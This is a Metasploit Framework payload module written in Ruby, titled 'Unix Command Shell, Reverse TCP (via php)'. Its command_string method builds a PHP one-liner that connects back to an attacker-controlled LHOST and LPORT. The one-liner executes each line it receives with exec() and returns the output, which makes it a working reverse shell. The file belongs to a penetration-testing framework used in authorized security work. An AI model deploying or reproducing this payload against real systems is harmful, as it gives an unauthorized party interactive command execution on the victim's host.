##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 238

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
     'Name'          => 'Unix Command Shell, Reverse TCP (via php)',
     'Description'   => 'Creates an interactive shell via php',
     'Author'        => 'Julien (jvoisin) Voisin',
     'License'       => BSD_LICENSE,
     'Platform'      => 'unix',
     'Arch'          => ARCH_CMD,
     'Handler'       => Msf::Handler::ReverseTcp,
     'Session'       => Msf::Sessions::CommandShell,
     'PayloadType'   => 'cmd',
     'RequiredCmd'   => 'php',
     'Payload'       =>
       {
         'Offsets' => { },
         'Payload' => ''
       }
    ))
    register_advanced_options(
      [
        OptString.new('PHPPath', [true, 'The path to the PHP executable', 'php'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    cmd = "#{datastore['PHPPath']} -r 'while($s=@fsockopen(\"#{datastore['LHOST']}:#{datastore['LPORT']}\"){while($l=fgets($s)){exec($l,$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}}'&"
  end
end
